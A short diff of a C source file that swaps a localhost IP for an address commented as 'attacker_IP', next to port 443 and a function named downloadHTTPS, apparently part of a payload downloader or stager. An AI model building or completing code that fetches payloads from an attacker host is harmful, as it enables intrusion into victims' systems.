@@ -12,8 +12,7 @@
 #define BUFFER_SIZE 1024
 
 char buffer[BUFFER_SIZE];
-char ip[] = "127.0.0.1";
-//char ip[] = "10.11.80.155";
+char ip[] = "10.10.10.10"; //attacker_IP
 int port = 443;
 
 int downloadHTTPS()
